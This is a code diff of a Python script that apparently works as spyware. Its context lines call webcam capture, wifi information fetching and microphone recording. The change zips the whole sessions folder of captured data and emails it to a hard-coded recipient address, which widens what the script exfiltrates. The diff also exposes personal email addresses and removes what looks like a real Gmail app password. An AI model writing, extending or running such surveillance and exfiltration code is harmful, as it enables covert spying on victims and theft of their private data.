@@ -25,7 +25,7 @@ import shutil
 
 # Global Variables
 email_address = "work.nihalrahman@gmail.com"  # Enter sender email
-password = "ffqefrxfjhhcubhz"  # Enter sender app password
+password = "password"  # Enter sender app password
 toaddr = "prabhatbajpai2005@gmail.com"  # Enter recipient email
 
 file_path = os.getcwd() + "\\"  # File save path
@@ -194,9 +194,12 @@ webcam_capture()
 wifi_info_fetch()
 microphone()
 
-filename = "system_info.txt"
-attachment = os.path.join(sessions_folder, filename)
-send_email(filename, attachment, toaddr)
+# Compress the sessions folder into a .zip file
+archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
+shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)
+
+# Send the .zip file as an attachment
+send_email(f"session_{currtime}.zip", archive_name, toaddr)
 
 # Start scheduled tasks in a separate thread
 schedule_thread = threading.Thread(target=run_scheduled_tasks)
